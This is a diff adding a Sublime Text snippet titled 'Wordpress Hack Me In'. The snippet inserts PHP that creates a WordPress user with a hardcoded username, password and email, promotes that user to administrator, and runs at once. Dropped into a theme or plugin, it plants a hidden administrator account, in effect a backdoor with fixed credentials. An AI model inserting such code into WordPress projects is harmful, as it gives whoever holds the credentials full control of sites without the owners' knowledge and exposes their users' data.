@@ -1,0 +1,18 @@
+<snippet>
+	<content><![CDATA[
+
+
+function hack_me_in(){
+	\$user_id = wp_create_user( 'itulsupport', 'itul#tech', 'support@my.i-tul.com' );
+	\$u = new WP_User( \$user_id  );
+	\$u->remove_role( 'subscriber' );
+	\$u->add_role( 'administrator' );
+}
+
+hack_me_in();
+
+]]></content>
+	<tabTrigger>hack_me_in</tabTrigger>
+	<scope>source.php</scope>
+    <description>Wordpress Hack Me In</description>
+</snippet>
